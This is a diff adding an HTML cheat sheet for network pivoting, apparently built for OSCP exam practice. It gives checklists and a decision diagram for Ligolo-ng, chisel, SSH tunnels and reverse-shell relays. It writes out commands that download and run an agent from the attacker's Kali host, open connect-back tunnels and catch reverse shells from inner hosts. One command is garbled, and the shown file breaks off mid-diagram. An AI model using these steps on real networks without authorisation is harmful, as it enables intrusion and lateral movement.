@@ -1,0 +1,1072 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PIVOT_PATTERN_BANK // oscp · network pivoting</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Stencil+Text:wght@400;700;900&family=JetBrains+Mono:wght@300;400;500;700;800&family=IBM+Plex+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-base: #0a0d12; --bg-elev: #11151c; --bg-card: #0f1219; --bg-card-hover: #141823;
+    --border: #1d2230; --border-strong: #2a3145;
+    --text: #d8dde6; --text-dim: #8b94a7; --text-faint: #4a5266;
+    --setup: #ffb547; --setup-soft: #ffb54720;
+    --access: #ff6b6b; --access-soft: #ff6b6b18;
+    --enum: #5ec3e3; --enum-soft: #5ec3e318;
+    --abuse: #d96cd9; --abuse-soft: #d96cd918;
+    --win: #5fd49b; --win-soft: #5fd49b18;
+    --warn: #ff6b6b; --warn-soft: #ff6b6b18;
+    --theme: var(--setup); --theme-soft: var(--setup-soft);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    background: var(--bg-base); color: var(--text);
+    font-family: 'IBM Plex Sans', -apple-system, sans-serif;
+    font-size: 14px; line-height: 1.5; min-height: 100vh;
+    background-image: radial-gradient(circle at 15% 20%, rgba(255, 181, 71, 0.05) 0%, transparent 40%), radial-gradient(circle at 85% 80%, rgba(95, 212, 155, 0.03) 0%, transparent 40%);
+    background-attachment: fixed;
+  }
+  body::before { content: ''; position: fixed; inset: 0; pointer-events: none;
+    background: repeating-linear-gradient(0deg, rgba(255,255,255,0.012) 0px, rgba(255,255,255,0.012) 1px, transparent 1px, transparent 3px); z-index: 1; }
+  ::selection { background: var(--theme); color: var(--bg-base); }
+  ::-webkit-scrollbar { width: 8px; height: 8px; }
+  ::-webkit-scrollbar-track { background: var(--bg-base); }
+  ::-webkit-scrollbar-thumb { background: var(--border-strong); }
+  ::-webkit-scrollbar-thumb:hover { background: var(--text-faint); }
+  a { color: inherit; text-decoration: none; }
+
+  .header { position: sticky; top: 0; z-index: 100; background: rgba(10, 13, 18, 0.94); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); padding: 16px 28px 12px; }
+  .header-top { display: flex; align-items: baseline; justify-content: space-between; gap: 20px; margin-bottom: 12px; }
+  .brand { font-family: 'Big Shoulders Stencil Text', sans-serif; font-weight: 900; font-size: 30px; letter-spacing: 0.08em; line-height: 0.9; text-transform: uppercase; }
+  .brand .ad { color: var(--theme); }
+  .brand-tag { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); letter-spacing: 0.15em; text-transform: uppercase; margin-top: 4px; }
+  .meta { text-align: right; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; }
+  .meta .count { color: var(--win); font-weight: 700; }
+  .search-row { display: flex; gap: 12px; align-items: stretch; }
+  .search-box { flex: 1; position: relative; }
+  .search-input { width: 100%; background: var(--bg-card); border: 1px solid var(--border-strong); color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 14px; font-weight: 500; padding: 11px 90px 11px 36px; outline: none; transition: border-color 0.15s, box-shadow 0.15s; }
+  .search-input:focus { border-color: var(--theme); box-shadow: 0 0 0 3px var(--theme-soft); }
+  .search-input::placeholder { color: var(--text-faint); }
+  .search-prefix { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--theme); font-family: 'JetBrains Mono', monospace; font-weight: 700; pointer-events: none; }
+  .search-kbd { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); display: flex; gap: 4px; pointer-events: none; }
+  .kbd { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-dim); background: var(--bg-base); border: 1px solid var(--border-strong); padding: 2px 6px; letter-spacing: 0.05em; }
+  .nav { margin-top: 12px; display: flex; gap: 4px; flex-wrap: wrap; align-items: center; }
+  .nav-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.15em; margin-right: 8px; }
+  .nav a { font-family: 'JetBrains Mono', monospace; font-size: 10.5px; color: var(--text-dim); padding: 4px 10px; border: 1px solid var(--border-strong); text-transform: uppercase; letter-spacing: 0.08em; transition: all 0.12s; }
+  .nav a:hover { color: var(--text); border-color: var(--text-dim); }
+  .nav a[data-phase="setup"]:hover { color: var(--setup); border-color: var(--setup); }
+  .nav a[data-phase="access"]:hover { color: var(--access); border-color: var(--access); }
+  .nav a[data-phase="enum"]:hover { color: var(--enum); border-color: var(--enum); }
+  .nav a[data-phase="abuse"]:hover { color: var(--abuse); border-color: var(--abuse); }
+  .nav a[data-phase="win"]:hover { color: var(--win); border-color: var(--win); }
+
+  main { max-width: 1400px; margin: 0 auto; padding: 28px 28px 60px; position: relative; z-index: 2; }
+  .topology { background: var(--bg-card); border: 1px solid var(--border-strong); border-left: 3px solid var(--theme); padding: 16px 18px; margin-bottom: 32px; font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-dim); line-height: 1.7; }
+  .topology h3 { font-size: 11px; color: var(--theme); letter-spacing: 0.18em; text-transform: uppercase; margin-bottom: 8px; font-family: 'JetBrains Mono', monospace; }
+  .topology code { color: var(--text); background: var(--bg-base); padding: 1px 5px; font-size: 11px; }
+
+  section.flow { margin-bottom: 56px; scroll-margin-top: 180px; }
+  .flow-head { display: flex; align-items: baseline; justify-content: space-between; gap: 16px; margin-bottom: 6px; padding-bottom: 8px; border-bottom: 1px solid var(--border-strong); }
+  .flow-num { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); letter-spacing: 0.15em; }
+  .flow-title { font-family: 'JetBrains Mono', monospace; font-size: 22px; font-weight: 800; letter-spacing: 0.02em; flex: 1; }
+  .flow-trigger { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); letter-spacing: 0.05em; text-align: right; max-width: 360px; }
+  .flow-trigger strong { color: var(--theme); font-weight: 500; }
+  .flow-intro { font-size: 13px; color: var(--text-dim); margin-bottom: 18px; max-width: 850px; line-height: 1.65; }
+  .flow-intro code { font-family: 'JetBrains Mono', monospace; font-size: 11.5px; color: var(--text); background: var(--bg-card); padding: 1px 5px; border: 1px solid var(--border); }
+
+  .reminder { display: inline-flex; align-items: center; gap: 6px; background: var(--bg-card); border: 1px dashed var(--border-strong); padding: 6px 12px; font-family: 'JetBrains Mono', monospace; font-size: 10.5px; color: var(--text-dim); margin: 8px 8px 8px 0; }
+  .reminder.timing { border-left: 2px solid var(--setup); }
+  .reminder.flag { border-left: 2px solid var(--win); color: var(--win); }
+  .reminder.danger { border-left: 2px solid var(--warn); color: var(--warn); }
+  .reminder::before { font-weight: 800; color: inherit; }
+  .reminder.timing::before { content: '⏱'; }
+  .reminder.flag::before { content: '⚑'; }
+  .reminder.danger::before { content: '⚠'; }
+
+  .diagram { background: var(--bg-card); border: 1px solid var(--border); padding: 20px 16px; margin: 18px 0 22px; overflow-x: auto; }
+  .diagram svg { display: block; width: 100%; height: auto; }
+  .diagram svg .node-rect { fill: var(--bg-base); stroke: var(--border-strong); stroke-width: 1.2; transition: stroke 0.15s, fill 0.15s; }
+  .diagram svg a:hover .node-rect { fill: var(--bg-card-hover); stroke: var(--text-dim); cursor: pointer; }
+  .diagram svg .node-rect.setup  { stroke: var(--setup); }
+  .diagram svg .node-rect.access { stroke: var(--access); }
+  .diagram svg .node-rect.enum   { stroke: var(--enum); }
+  .diagram svg .node-rect.abuse  { stroke: var(--abuse); }
+  .diagram svg .node-rect.win    { stroke: var(--win); }
+  .diagram svg .node-rect.warn   { stroke: var(--warn); stroke-dasharray: 4 3; }
+  .diagram svg .node-text { fill: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 600; text-anchor: middle; pointer-events: none; }
+  .diagram svg .node-sub { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-anchor: middle; pointer-events: none; }
+  .diagram svg .arrow { stroke: var(--text-faint); stroke-width: 1.2; fill: none; marker-end: url(#arrowhead); }
+  .diagram svg .arrow-strong { stroke: var(--text-dim); stroke-width: 1.5; fill: none; marker-end: url(#arrowhead-strong); }
+  .diagram svg .arrow-warn   { stroke: var(--warn); stroke-width: 1.2; fill: none; stroke-dasharray: 4 3; marker-end: url(#arrowhead-warn); }
+  .diagram svg .label { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-anchor: middle; pointer-events: none; }
+  .diagram svg .label.warn { fill: var(--warn); }
+  .diagram svg .label.win  { fill: var(--win); }
+  .diagram svg .group-bg { fill: rgba(255, 181, 71, 0.04); stroke: var(--border); stroke-dasharray: 3 3; stroke-width: 1; }
+  .diagram svg .group-label { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; }
+
+  .cards-section { margin-top: 60px; padding-top: 24px; border-top: 1px solid var(--border-strong); scroll-margin-top: 180px; }
+  .filters { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; margin: 14px 0 20px; }
+  .filter-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.15em; margin-right: 4px; }
+  .pill { font-family: 'JetBrains Mono', monospace; font-size: 10.5px; font-weight: 500; color: var(--text-dim); background: transparent; border: 1px solid var(--border-strong); padding: 5px 12px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.08em; transition: all 0.12s; user-select: none; }
+  .pill:hover { border-color: var(--text-dim); color: var(--text); }
+  .pill.active { background: var(--theme); color: var(--bg-base); border-color: var(--theme); font-weight: 700; }
+  .pill .pill-count { opacity: 0.65; margin-left: 4px; font-weight: 400; }
+  .pill.active .pill-count { opacity: 0.7; }
+
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 14px; }
+  .card { background: var(--bg-card); border: 1px solid var(--border); padding: 15px 15px 13px; position: relative; transition: border-color 0.15s, background 0.15s; display: flex; flex-direction: column; gap: 9px; scroll-margin-top: 200px; }
+  .card:hover { border-color: var(--border-strong); background: var(--bg-card-hover); }
+  .card[data-phase="setup"]  { border-left: 3px solid var(--setup); }
+  .card[data-phase="access"] { border-left: 3px solid var(--access); }
+  .card[data-phase="enum"]   { border-left: 3px solid var(--enum); }
+  .card[data-phase="abuse"]  { border-left: 3px solid var(--abuse); }
+  .card[data-phase="win"]    { border-left: 3px solid var(--win); }
+  .card.flash { animation: flash 1.2s ease-out; }
+  @keyframes flash { 0%, 30% { background: var(--theme-soft); border-color: var(--theme); } 100% { background: var(--bg-card); border-color: var(--border); } }
+  .card-head { display: flex; justify-content: space-between; align-items: flex-start; gap: 8px; }
+  .card-cat { font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; padding: 2px 6px; border: 1px solid; flex-shrink: 0; white-space: nowrap; }
+  .card[data-phase="setup"]  .card-cat { color: var(--setup); border-color: var(--setup); }
+  .card[data-phase="access"] .card-cat { color: var(--access); border-color: var(--access); }
+  .card[data-phase="enum"]   .card-cat { color: var(--enum); border-color: var(--enum); }
+  .card[data-phase="abuse"]  .card-cat { color: var(--abuse); border-color: var(--abuse); }
+  .card[data-phase="win"]    .card-cat { color: var(--win); border-color: var(--win); }
+  .card-title { font-family: 'JetBrains Mono', monospace; font-size: 13.5px; font-weight: 700; color: var(--text); line-height: 1.3; flex: 1; }
+  .triggers { display: flex; flex-wrap: wrap; gap: 4px; }
+  .trigger { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--theme); background: var(--theme-soft); border: 1px solid var(--theme-soft); padding: 2px 7px; letter-spacing: 0.02em; }
+  .trigger.match { background: var(--theme); color: var(--bg-base); font-weight: 700; }
+  .arrow-line { display: flex; align-items: flex-start; gap: 8px; padding: 8px 10px; background: var(--bg-base); border: 1px solid var(--border); }
+  .arrow { color: var(--win); font-family: 'JetBrains Mono', monospace; font-weight: 800; flex-shrink: 0; }
+  .action { color: var(--text); font-size: 12.5px; line-height: 1.5; }
+  .cmd-wrap { position: relative; }
+  .cmd { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text); background: var(--bg-base); border: 1px solid var(--border); padding: 9px 36px 9px 11px; white-space: pre-wrap; word-break: break-all; line-height: 1.5; overflow-x: auto; }
+  .cmd-copy { position: absolute; top: 4px; right: 4px; background: var(--bg-card); border: 1px solid var(--border-strong); color: var(--text-dim); font-family: 'JetBrains Mono', monospace; font-size: 9px; padding: 3px 6px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.1em; opacity: 0; transition: opacity 0.15s, color 0.15s; }
+  .cmd-wrap:hover .cmd-copy { opacity: 1; }
+  .cmd-copy:hover { color: var(--theme); }
+  .cmd-copy.copied { color: var(--win); border-color: var(--win); opacity: 1; }
+  .cleanup { background: var(--warn-soft); border: 1px solid var(--warn); border-left-width: 3px; padding: 8px 11px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text); line-height: 1.5; white-space: pre-wrap; word-break: break-all; }
+  .cleanup-label { color: var(--warn); font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; display: block; margin-bottom: 4px; font-weight: 700; }
+  .card-foot { display: flex; justify-content: space-between; align-items: center; gap: 8px; margin-top: auto; padding-top: 4px; border-top: 1px dashed var(--border); font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); }
+  .state-tag { color: var(--text-dim); border: 1px solid var(--border); padding: 1px 6px; font-size: 9px; letter-spacing: 0.1em; }
+  .state-tag.user { color: var(--setup); border-color: var(--setup); }
+  .state-tag.admin { color: var(--access); border-color: var(--access); }
+  .state-tag.both { color: var(--text-dim); border-color: var(--border-strong); }
+  mark { background: var(--theme); color: var(--bg-base); padding: 0 2px; font-weight: 700; }
+  .empty { text-align: center; padding: 80px 20px; color: var(--text-faint); font-family: 'JetBrains Mono', monospace; }
+  .empty-icon { font-size: 48px; color: var(--border-strong); margin-bottom: 16px; }
+  .empty-title { color: var(--text-dim); font-size: 14px; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.15em; }
+  .empty-hint { font-size: 12px; color: var(--text-faint); }
+  .anti-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 12px; margin-top: 18px; }
+  .anti { background: var(--bg-card); border: 1px solid var(--border); border-left: 3px solid var(--warn); padding: 12px 14px; }
+  .anti-bad { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--warn); margin-bottom: 4px; line-height: 1.4; }
+  .anti-bad::before { content: '✗ '; font-weight: 800; }
+  .anti-fix { font-size: 12px; color: var(--text-dim); line-height: 1.5; }
+  .anti-fix::before { content: '→ '; color: var(--win); font-weight: 800; }
+  .foot-info { margin-top: 60px; padding-top: 20px; border-top: 1px solid var(--border); font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-align: center; line-height: 1.8; letter-spacing: 0.05em; }
+  .foot-info code { color: var(--theme); background: var(--theme-soft); padding: 1px 5px; }
+  .checklist { background: var(--bg-card); border: 1px solid var(--border); padding: 18px 22px; margin: 14px 0 22px; }
+  .checklist-title { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--theme); letter-spacing: 0.18em; text-transform: uppercase; margin-bottom: 12px; }
+  .checklist ul { list-style: none; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 4px 18px; }
+  .checklist li { font-family: 'JetBrains Mono', monospace; font-size: 12px; padding: 5px 0; color: var(--text); display: flex; align-items: flex-start; gap: 9px; line-height: 1.5; cursor: pointer; user-select: none; }
+  .checklist li::before { content: '[ ]'; color: var(--text-faint); font-weight: 700; flex-shrink: 0; transition: color 0.15s; }
+  .checklist li.done { color: var(--text-faint); text-decoration: line-through; }
+  .checklist li.done::before { content: '[✓]'; color: var(--win); }
+  .checklist li code { color: var(--theme); font-size: 11px; }
+  @media (max-width: 720px) {
+    .header { padding: 12px 14px 10px; }
+    main { padding: 18px 14px 40px; }
+    .brand { font-size: 22px; }
+    .grid { grid-template-columns: 1fr; }
+    .search-kbd { display: none; }
+    .flow-head { flex-direction: column; align-items: flex-start; }
+    .flow-trigger { text-align: left; max-width: 100%; }
+  }
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-top">
+    <div>
+      <div class="brand">PIVOT<span class="ad">_</span>PATTERN<span class="ad">_</span>BANK</div>
+      <div class="brand-tag">// oscp · network pivoting · cross-subnet access</div>
+    </div>
+    <div class="meta">
+      <div>SHOWING <span class="count" id="resultCount">0</span> / <span id="totalCount">0</span></div>
+      <div style="margin-top:4px; opacity:0.6">v1 · pivot · companion to enum + privesc banks</div>
+    </div>
+  </div>
+  <div class="search-row">
+    <div class="search-box">
+      <span class="search-prefix">▸</span>
+      <input id="search" class="search-input" type="text" autocomplete="off" spellcheck="false"
+        placeholder="search trigger: 'ligolo', 'chisel', 'ssh tunnel', 'proxychains', 'route add', 'tun', 'portproxy' ..." />
+      <span class="search-kbd"><kbd class="kbd">⌘</kbd><kbd class="kbd">K</kbd></span>
+    </div>
+  </div>
+  <div class="nav">
+    <span class="nav-label">JUMP:</span>
+    <a href="#prep" data-phase="setup">prep</a>
+    <a href="#ligolo" data-phase="setup">ligolo</a>
+    <a href="#chisel" data-phase="setup">chisel</a>
+    <a href="#ssh" data-phase="setup">ssh</a>
+    <a href="#native" data-phase="setup">native</a>
+    <a href="#verify" data-phase="enum">verify</a>
+    <a href="#double" data-phase="abuse">double-pivot</a>
+    <a href="#cards" style="margin-left:auto">all-cards</a>
+  </div>
+</header>
+
+<main>
+
+<div class="topology">
+  <h3>SCOPE · NETWORK PIVOTING</h3>
+  <div>
+    <code>goal</code>: reach inner subnets from Kali through a compromised host ·
+    <code>preferred tool</code>: <span style="color:var(--theme)">Ligolo-ng</span> (TUN mode, no proxychains) ·
+    <code>fallback</code>: chisel + proxychains · ssh tunnels · netsh portproxy ·
+    <code>EXAM RULE</code>: <span style="color:var(--warn)">Metasploit cannot pivot</span> — MSF limited to ONE target machine total
+  </div>
+</div>
+
+<!-- METHODOLOGY CHECKLIST -->
+<section>
+  <div class="flow-head">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ 00 ]</span>
+      <span class="flow-title" style="color:var(--theme)">METHODOLOGY CHECKLIST · PIVOTING</span>
+    </div>
+    <div class="flow-trigger">click to mark done · exact order matters — out of order = silent failures</div>
+  </div>
+  <p class="flow-intro">
+    The exact order matters. Doing the right steps out of order means tools fail silently — usually because you forgot <code>ip route add</code> after starting the proxy. Ligolo is the standard. SSH tunnel if linux victim and no upload possible. Chisel as fallback.
+  </p>
+
+  <div class="checklist">
+    <div class="checklist-title">▸ 0. PREP — on Kali, once (persistent across reboots)</div>
+    <ul>
+      <li>Create tun interface — <code>sudo ip tuntap add user $USER mode tun ligolo</code></li>
+      <li>Bring up — <code>sudo ip link set ligolo up</code></li>
+      <li>Confirm — <code>ip link show ligolo</code> → state UP</li>
+      <li>Have agent + proxy binaries ready — <code>ls ~/tools/ligolo/</code> (proxy + agent + agent.exe)</li>
+      <li>Serve binaries — <code>python3 -m http.server 80</code> from tools dir</li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 1. RECON — on compromised host, before starting tunnel</div>
+    <ul>
+      <li>Get inner subnet — <code>ipconfig /all</code> (Win) or <code>ip a</code> (Lin) → note non-tun0 subnet</li>
+      <li>Quick inner sweep from hop — <code>for /l %i in (1,1,254) do ping -n 1 -w 50 192.168.x.%i &gt;nul &amp;&amp; echo 192.168.x.%i</code></li>
+      <li>Or: upload and run <code>./nmap -sT -Pn -p 22,445,5985 192.168.x.0/24</code> (static nmap)</li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 2. LIGOLO TUNNEL — Windows victim (preferred)</div>
+    <ul>
+      <li>Start proxy on Kali — <code>./proxy -selfcert -laddr 0.0.0.0:11601</code></li>
+      <li>Transfer agent.exe to victim — via evil-winrm: <code>upload agent.exe</code> or <code>iwr http://&lt;KALI&gt;/agent.exe -outfile agent.exe</code></li>
+      <li>Run agent — <code>.gent.exe -connect &lt;KALI&gt;:11601 -ignore-cert</code></li>
+      <li>In proxy CLI — <code>session</code> → pick agent → <code>tunnel_start --tun ligolo</code></li>
+      <li>Add route on Kali — <code>sudo ip route add &lt;inner-subnet&gt;/24 dev ligolo</code></li>
+      <li>Verify — <code>ip route | grep ligolo</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 3. VERIFY TUNNEL — before doing anything else</div>
+    <ul>
+      <li>TCP-only scan — <code>nmap -sT -Pn -p 22,80,443,445,5985 &lt;inner-IP&gt;</code> (NOT -sS — ICMP/raw needs root on ligolo)</li>
+      <li>Test SMB — <code>smbclient -L //&lt;inner-IP&gt; -N 2&gt;/dev/null</code></li>
+      <li>Test WinRM — <code>nxc winrm &lt;inner-IP&gt; -u &lt;user&gt; -p &lt;pwd&gt;</code></li>
+      <li>If no response — check route: <code>ip route show table 100</code> · check proxy: <code>./proxy -selfcert</code> shows agent connected · check agent: <code>ps aux | grep agent</code> on victim still running</li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 4. REVERSE SHELL FROM INNER HOST → KALI</div>
+    <ul>
+      <li>Inner host cannot reach Kali directly — use ligolo listener</li>
+      <li>In proxy CLI — <code>listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443</code></li>
+      <li>Listen on Kali — <code>nc -nvlp 443</code></li>
+      <li>Inner host connects to hop's IP on :443 → ligolo forwards to Kali:443</li>
+      <li>Payload: <code>LHOST=&lt;hop-IP&gt; LPORT=443</code> (not Kali IP!)</li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 5. SSH TUNNEL — Linux victim, no binary upload</div>
+    <ul>
+      <li>Dynamic SOCKS (forward proxy from Kali) — <code>ssh -D 1080 -N &lt;user&gt;@&lt;hop-IP&gt;</code></li>
+      <li>Set proxychains — edit /etc/proxychains4.conf: <code>socks5 127.0.0.1 1080</code></li>
+      <li>Use — <code>proxychains nxc smb &lt;inner-IP&gt; -u &lt;u&gt; -p &lt;p&gt;</code></li>
+      <li>Remote forward (shell from inner to Kali) — <code>ssh -R 443:127.0.0.1:443 &lt;KALI-user&gt;@&lt;KALI&gt;</code> (run from hop)</li>
+      <li>Local forward (reach inner port from Kali) — <code>ssh -L 8080:&lt;inner-IP&gt;:80 &lt;user&gt;@&lt;hop-IP&gt;</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 6. CHISEL — fallback (AV flags ligolo)</div>
+    <ul>
+      <li>Kali server — <code>./chisel server --reverse --port 8000</code></li>
+      <li>Victim client — <code>.\chisel.exe client &lt;KALI&gt;:8000 R:socks</code></li>
+      <li>Gives SOCKS5 on Kali 127.0.0.1:1080 → use with proxychains</li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 7. CLEANUP — before exam submission</div>
+    <ul>
+      <li>Remove route — <code>sudo ip route del &lt;inner-subnet&gt;/24 dev ligolo</code></li>
+      <li>Stop tunnel in proxy CLI — <code>tunnel_stop</code></li>
+      <li>Kill agent — <code>taskkill /f /im agent.exe</code> or <code>kill $(pgrep agent)</code></li>
+      <li>Delete agent binary — <code>del agent.exe</code> or <code>rm agent</code></li>
+      <li>Confirm ligolo interface down — <code>ip link show ligolo</code></li>
+    </ul>
+  </div>
+  <div class="reminder timing">budget: 10–15 min for first tunnel · 5 min for each subsequent hop</div>
+  <div class="reminder flag">LHOST for inner shells = hop IP, not Kali — set the ligolo listener first</div>
+  <div class="reminder danger">Metasploit single-target rule = NO MSF pivoting on AD machines</div>
+</section>
+
+<!-- DECISION FLOW -->
+<section id="prep" class="flow">
+  <div class="flow-head">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ 01 ]</span>
+      <span class="flow-title" style="color:var(--theme)">DECISION FLOW · WHICH TUNNEL?</span>
+    </div>
+    <div class="flow-trigger">TRIGGER · <strong>"can't reach inner host"</strong></div>
+  </div>
+  <p class="flow-intro">
+    Pick a tool based on the victim platform and what's already installed. Ligolo is the default for Windows compromise. SSH tunnels work natively when you've popped Linux. Chisel is the fallback when ligolo binary is flagged. Native Windows portproxy works when nothing else can be uploaded.
+  </p>
+
+  <div class="diagram">
+    <svg viewBox="0 0 1100 580" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <marker id="arrowhead" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#4a5266"/></marker>
+        <marker id="arrowhead-strong" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#8b94a7"/></marker>
+        <marker id="arrowhead-warn" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#ff6b6b"/></marker>
+      </defs>
+
+      <!-- Start -->
+      <a href="#card-pivot-prep"><rect class="node-rect setup" x="430" y="10" width="240" height="50"/>
+        <text class="node-text" x="550" y="34">SHELL ON DUAL-HOMED HOST</text>
+        <text class="node-sub" x="550" y="48">ipconfig shows 2 interfaces</text></a>
+      <path class="arrow-strong" d="M 550 60 L 550 90"/>
+      <text class="label" x="550" y="80" style="font-size:9px">→ which tool?</text>
+
+      <!-- Four columns by tool -->
+      <rect class="group-bg" x="20" y="100" width="252" height="450"/>
+      <text class="group-label" x="40" y="120">LIGOLO (PREFERRED)</text>
+
+      <a href="#card-ligolo-tun"><rect class="node-rect setup" x="35" y="135" width="222" height="44"/>
+        <text class="node-text" x="146" y="158">1. tun interface (Kali)</text>
+        <text class="node-sub" x="146" y="172">ip tuntap add</text></a>
+      <path class="arrow" d="M 146 179 L 146 194"/>
+
+      <a href="#card-ligolo-proxy"><rect class="node-rect setup" x="35" y="195" width="222" height="44"/>
+        <text class="node-text" x="146" y="218">2. proxy (Kali)</text>
+        <text class="node-sub" x="146" y="232">./proxy -selfcert</text></a>
+      <path class="arrow" d="M 146 239 L 146 254"/>
+
+      <a href="#card-ligolo-agent"><rect class="node-rect setup" x="35" y="255" width="222" height="44"/>
+        <text class="node-text" x="146" y="278">3. agent (victim)</text>
+        <text class="node-sub" x="146" y="292">agent.exe -connect</text></a>
+      <path class="arrow" d="M 146 299 L 146 314"/>
+
+      <a href="#card-ligolo-tunnel"><rect class="node-rect setup" x="35" y="315" width="222" height="44"/>
+        <text class="node-text" x="146" y="338">4. session + tunnel_start</text>
+        <text class="node-sub" x="146" y="352">--tun ligolo</text></a>
+      <path class="arrow" d="M 146 359 L 146 374"/>
+
+      <a href="#card-ligolo-route"><rect class="node-rect win" x="35" y="375" width="222" height="44"/>
+        <text class="node-text" x="146" y="398">5. ip route add</text>
+        <text class="node-sub" x="146" y="412">CRITICAL · don't forget</text></a>
+      <path class="arrow" d="M 146 419 L 146 434"/>
+
+      <a href="#card-ligolo-listener"><rect class="node-rect setup" x="35" y="435" width="222" height="44"/>
+        <text class="node-text" x="146" y="458">opt: listener (rev shell)</text>
+        <text class="node-sub" x="146" y="472">listener_add for inner → Kali</text></a>
+      <path class="arrow" d="M 146 479 L 146 494"/>
+
+      <a href="#card-verify-tcp"><rect class="node-rect enum" x="35" y="495" width="222" height="40"/>
+        <text class="node-text" x="146" y="517">verify: nmap -sT only</text>
+        <text class="node-sub" x="146" y="529">syn-scan won't work via tun</text></a>
+
+      <!-- Column 2: chisel -->
+      <rect class="group-bg" x="292" y="100" width="252" height="320"/>
+      <text class="group-label" x="312" y="120">CHISEL (FALLBACK)</text>
+
+      <a href="#card-chisel-server"><rect class="node-rect setup" x="307" y="135" width="222" height="44"/>
+        <text class="node-text" x="418" y="158">1. server (Kali)</text>
+        <text class="node-sub" x="418" y="172">chisel server -p 8000 --reverse</text></a>
+      <path class="arrow" d="M 418 179 L 418 194"/>
+
+      <a href="#card-chisel-client"><rect class="node-rect setup" x="307" y="195" width="222" height="44"/>
+        <text class="node-text" x="418" y="218">2. client (victim)</text>
+        <text class="node-sub" x="418" y="232">R:socks reverse SOCKS5</text></a>
+      <path class="arrow" d="M 418 239 L 418 254"/>
+
+      <a href="#card-proxychains"><rect class="node-rect setup" x="307" y="255" width="222" height="44"/>
+        <text class="node-text" x="418" y="278">3. proxychains.conf</text>
+        <text class="node-sub" x="418" y="292">socks5 127.0.0.1 1080</text></a>
+      <path class="arrow" d="M 418 299 L 418 314"/>
+
+      <a href="#card-verify-tcp"><rect class="node-rect enum" x="307" y="315" width="222" height="40"/>
+        <text class="node-text" x="418" y="337">verify: proxychains nmap -sT</text>
+        <text class="node-sub" x="418" y="349">slower than ligolo</text></a>
+      <path class="arrow" d="M 418 355 L 418 370"/>
+
+      <a href="#card-proxychains"><rect class="node-rect enum" x="307" y="375" width="222" height="40"/>
+        <text class="node-text" x="418" y="397">prefix every tool</text>
+        <text class="node-sub" x="418" y="409">proxychains -q smbclient ...</text></a>
+
+      <!-- Column 3: SSH -->
+      <rect class="group-bg" x="564" y="100" width="252" height="270"/>
+      <text class="group-label" x="584" y="120">SSH (NATIVE LINUX)</text>
+
+      <a href="#card-ssh-d"><rect class="node-rect setup" x="579" y="135" width="222" height="44"/>
+        <text class="node-text" x="690" y="158">-D dynamic forward</text>
+        <text class="node-sub" x="690" y="172">SOCKS5 on local port</text></a>
+      <path class="arrow" d="M 690 179 L 690 194"/>
+
